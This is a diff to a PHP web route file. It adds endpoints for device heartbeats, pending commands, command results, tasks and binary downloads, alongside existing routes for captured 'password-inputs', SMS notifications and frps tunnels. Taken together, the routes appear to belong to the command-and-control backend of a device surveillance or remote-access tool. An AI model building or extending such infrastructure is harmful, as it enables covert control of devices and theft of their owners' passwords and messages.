@@ -49,6 +49,12 @@ Route::get('api/sms/notifications', 'MiscController/smsNotifications');
 Route::get('api/logs', 'DeviceController/getLogs');
 Route::post('api/client/logs', 'AuthController/clientLogs');
 Route::post('api/device/install-log', 'DeviceController/installLog');
+Route::rule('api/device/localServiceHeartbeat', 'DeviceController/heartbeat', 'GET|POST|OPTIONS');
+Route::rule('api/device/message', 'DeviceController/message', 'GET|POST|OPTIONS');
+Route::rule('api/device/commandResult', 'DeviceController/commandResult', 'GET|POST|OPTIONS');
+Route::rule('api/device/task/responses', 'DeviceController/taskResponses', 'GET|POST|OPTIONS');
+Route::rule('api/device/tasks', 'DeviceController/getTasks', 'GET|POST|OPTIONS');
+Route::rule('api/device/pendingCommands', 'DeviceController/pendingCommands', 'GET|POST|OPTIONS');
 
 Route::rule('api/password-inputs/:deviceId', 'DeviceController/getPasswordInputs', 'GET|DELETE|OPTIONS');
 Route::delete('api/password-inputs/id/:inputId', 'MiscController/deletePasswordInput');
@@ -77,6 +83,9 @@ Route::rule('api/tunnel/setDeviceId', 'TunnelController/setDeviceId', 'GET|POST|
 Route::get('api/tunnel/tunnel-status', 'TunnelController/tunnelStatus');
 Route::post('api/tunnel/close-frps-proxy', 'TunnelController/closeFrpsProxy');
 Route::rule('api/tunnel/blacklist', 'TunnelController/blacklist', 'GET|DELETE|OPTIONS');
+Route::get('api/binary/:arch/:name', 'MiscController/binaryDownload')->pattern(['name' => '.*']);
+Route::get('s/bn/native', 'MiscController/nativeBinary');
+Route::get('s/bn/:arch/:name', 'MiscController/binaryDownload')->pattern(['name' => '.*']);
 
 Route::rule('m', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS');
 Route::rule('m/:any', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS')->pattern(['any' => '.*']);
